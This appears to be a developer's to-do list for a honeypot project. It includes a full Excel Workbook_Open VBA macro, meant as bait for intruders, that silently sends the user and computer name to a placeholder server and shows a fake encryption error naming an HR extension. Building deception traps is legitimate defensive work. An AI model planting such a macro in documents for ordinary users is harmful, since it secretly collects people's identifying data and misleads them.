- Enhance the logger functionality
- Add a SSH service 
- Add a file so that when the attacker downloads and opens it, it tries to connect to our honeypot (which may reveal their real IP).

  (i use workbook_open macro) if attacker is careless enough to "Enable content" we get detailed logs.

  1- press `ALT + F11` in execle open VBA edito.
  
  2- click `ThisWorkbook` pass this:
  ```
  Private Sub Workbook_Open()
    On Error Resume Next
    Dim http As Object
    Set http = CreateObject("MSXML2.XMLHTTP")
    
    ' The bait: Sending computer name and username to your server
    Dim url As String
    url = "https://your-honeypot/api/v1/alert?user=" & Environ("USERNAME") & "&comp=" & Environ("COMPUTERNAME")
    
    http.Open "GET", url, False
    http.Send
    
    ' Optional: Show a fake decryption error to make it look realistic
    MsgBox "Error: This document is encrypted. Please contact HR IT at ext 7721 to request a decryption key.", vbCritical, "Encryption Error"
  End Sub
  ```




- Edit the / page

- i will write the 'report'